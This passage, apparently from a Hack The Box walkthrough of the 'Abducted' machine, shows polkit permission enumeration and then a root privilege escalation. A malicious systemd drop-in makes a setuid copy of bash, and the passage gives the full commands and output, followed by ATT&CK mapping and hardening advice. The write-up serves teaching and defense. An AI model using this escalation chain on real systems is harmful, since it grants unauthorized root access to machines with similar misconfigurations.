- `pkcheck --action-id <action>` — the specific action to evaluate
- `--process $$` — evaluate the authorization for the _current shell's_ process (`$$` expands to its PID)

**Expected output:**

```
marcus@abducted:~$ for action in $(pkaction); do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
ALLOWED: org.freedesktop.login1.inhibit-block-idle
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.inhibit-delay-sleep
ALLOWED: org.freedesktop.login1.set-self-linger
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

**Decision point:** Most of these `ALLOWED` lines are noise — `login1.inhibit-*` and `set-self-linger` are granted to any active local session by default on most distributions, not because of `operators` specifically. The one that matters is `org.freedesktop.systemd1.reload-daemon`: `operators` can reload the systemd manager without a password. Notably, `org.freedesktop.systemd1.manage-units` — which covers starting, stopping, and restarting individual units — does _not_ show up as allowed here, and that absence needs interpreting rather than taken at face value.

**If this fails...:** If `reload-daemon` hadn't shown up as allowed either, the drop-in from item 12 would be unreachable without the root password, and the search would have to move to other `operators`-group surfaces instead.

**Under the hood:** The `manage-units` rule not appearing here doesn't mean it's denied outright — it means the rule granting it is _conditional_. Polkit rules are JavaScript predicates, and this one checks something like `action.lookup("unit") == "smbd.service"` before granting the action; a blanket `pkcheck` call supplies no unit detail at all, so that condition is never satisfied and the check correctly reads as denied _for this test_. But when `systemctl restart smbd` runs for real, systemd's own D-Bus call to polkit _does_ include `unit=smbd.service` as part of the request, which satisfies the condition — so the real restart command succeeds without a password prompt even though the blanket enumeration above suggested it wouldn't.

**Classification & defense:**

- **CWE-269** (Improper Privilege Management) for the unscoped `reload-daemon` grant and the narrowly-conditional-but-still-too-permissive `manage-units` rule.
- **OWASP A01:2021 – Broken Access Control.**
- MITRE ATT&CK **T1548** (Abuse Elevation Control Mechanism) — the parent technique for subverting an OS authorization layer like polkit.
- Defense: avoid granting `reload-daemon` to any non-admin group, since reload is almost always a prerequisite for abusing _any_ drop-in anywhere on the system; if a unit-scoped grant is genuinely needed, pair it with filesystem permissions (item 12) that don't independently hand out write access to that unit's own configuration.

**Key takeaway:** _A blanket authorization test can under-report what a conditional rule actually grants — re-test with the exact parameters the real caller would send before concluding something is denied._

### 14. Writing the Malicious Drop-In and Triggering Root

**Goal:** Combine the write access (item 12) and the passwordless reload/restart (item 13) into an actual root shell.

**Why this command?:** `ExecStartPre=` directives run as root, before `smbd`'s main process starts, every time the unit starts — so a drop-in with two `ExecStartPre=` lines (copy `bash`, then mark the copy setuid) is a clean, minimal way to leave a reusable root-owned binary behind without touching the running `smbd` process at all.

**How it works:** `daemon-reload` tells systemd to re-read all unit files and merge in the new drop-in; `restart smbd` then stops and starts the unit fresh, running the merged `ExecStartPre=` lines as root before the real `smbd` binary ever executes.

**Flags explained:**

- `ExecStartPre=/bin/cp /bin/bash /tmp/.rb` — copy `bash` to a hidden-looking path
- `ExecStartPre=/bin/chmod 4755 /tmp/.rb` — set the setuid bit (`4`) plus `rwxr-xr-x`
- `/tmp/.rb -p -c '...'` — the `-p` (privileged) flag is essential: without it, Bash detects that its effective UID (root, from the setuid bit) doesn't match its real UID (`marcus`) and immediately drops back to the real UID before running anything, silently defeating the setuid bit; `-p` tells Bash to keep the elevated effective UID and skip the startup files that could otherwise be used to hijack a privileged shell

**Expected output:**

```
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
marcus@abducted:~$ ls -l /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
<REDACTED>
```

**Decision point:** The `euid=0(root)` in the `id` output — distinct from `uid=1001(marcus)` — confirms the shell has root's _effective_ privileges while still technically being `marcus`'s process; that's exactly the state the `-p` flag preserves, and exactly what would silently vanish without it.

**If this fails...:** If `/tmp/.rb` exists but running it doesn't yield root (`euid` stays `1001`), the `-p` flag was almost certainly omitted — one of the most common mistakes in setuid-binary privilege escalation generally, not specific to this box.

**Under the hood:** Two independent weaknesses had to both be true for this to work: a world-writable-by-group configuration surface for a root-run service (item 12), and a passwordless path to make systemd actually _apply_ that configuration (item 13). Neither alone is exploitable — the drop-in does nothing until reloaded and the service restarted, and the polkit grant alone doesn't help without something to reload into. The combination is what turns two individually-plausible, separately-justifiable configuration choices into a direct root compromise.

**Classification & defense:**

- **CWE-732** and **CWE-269** together, as the convergence of items 12 and 13.
- MITRE ATT&CK **T1543.002** (Create or Modify System Process: Systemd Service) for the exploitation action itself.
- Defense: fix either half and the chain breaks — remove group-write from the drop-in directory, _or_ stop delegating `reload-daemon` to `operators`. Doing both is the real fix. Operationally, monitor for new files under any `*.service.d/` directory and for `daemon-reload`+`restart` sequences outside a known maintenance window, since both are unusual activity otherwise.

**Key takeaway:** _Privilege escalation chains are often two individually-reasonable-looking configuration choices that only become dangerous in combination — check what's reachable once access is combined, not just what each piece permits alone._

---

## MITRE ATT&CK Chain Summary

|   |   |   |
|---|---|---|
|Stage|Tactic|Technique (ID)|
|SMB/RPC enumeration|Reconnaissance, Discovery|Network Service Discovery (T1046); Network Share Discovery (T1135); Gather Victim Host/Network Info (T1590/T1592)|
|CVE triage & exploitation|Initial Access, Execution|Exploitation of Remote Services (T1210); Command and Scripting Interpreter: Unix Shell (T1059.004)|
|rclone credential recovery|Credential Access|Unsecured Credentials: Credentials In Files (T1552.001)|
|Password reuse → `scott`|Lateral Movement|Valid Accounts (T1078); Remote Services: SSH (T1021.004)|
|Symlink → `authorized_keys` as `marcus`|Persistence|Account Manipulation: SSH Authorized Keys (T1098.004)|
|systemd drop-in + polkit → `root`|Privilege Escalation|Create or Modify System Process: Systemd Service (T1543.002); Abuse Elevation Control Mechanism (T1548)|

---

## Overall Hardening Recommendations

**Samba configuration**

- Patch to Samba ≥4.22.10 / 4.23.8 / 4.24.3, or at minimum strip `%J` from any external print command, or move to `printing = cups`.
- Never combine `wide links = yes` with `allow insecure wide links = yes`; keep Unix extensions enabled unless there's a specific reason not to.
- Disable guest/anonymous access (`map to guest`, `guest ok`) on any share that doesn't explicitly require it.

**Secrets & credentials**

- Treat rclone's "obscure" as non-protective; use its real config-encryption feature (`RCLONE_CONFIG_PASS`) or a proper secrets manager instead.
- Restrict permissions on any file holding service credentials (`chmod 600`, correct ownership).
- Never reuse a service-account credential as an interactive login password.

**systemd & polkit**

- Keep `*.service.d/` drop-in directories root-owned with no group write access, especially for services that run as root.
- Scope polkit grants as narrowly as possible, and remember that unit-conditional rules only show their real effect when tested with the same parameters the real caller would send.
- Treat `reload-daemon` as equivalent to a root-adjacent capability whenever it's combined with any writable unit or drop-in location.

**Detection**

- Monitor for unexpected outbound connections from service hosts that have no legitimate reason to initiate them (print servers, backup agents).
- Watch for new files under systemd drop-in directories and for `daemon-reload`/`restart` sequences outside planned maintenance.
- File-integrity-monitor `~/.ssh/authorized_keys` for unexpected changes.

## References

- CVE-2026-4480 (NVD / Red Hat CWE classification): https://db.gcve.eu/vuln/CVE-2026-4480
- HTB machine page — _Abducted_ (Medium, Linux): https://www.hackthebox.com/machines/abducted
- rclone's obscure/reveal mechanism is documented in the rclone project's own source (`fs/config/obscure/obscure.go`) and forum discussion of its non-cryptographic purpose.
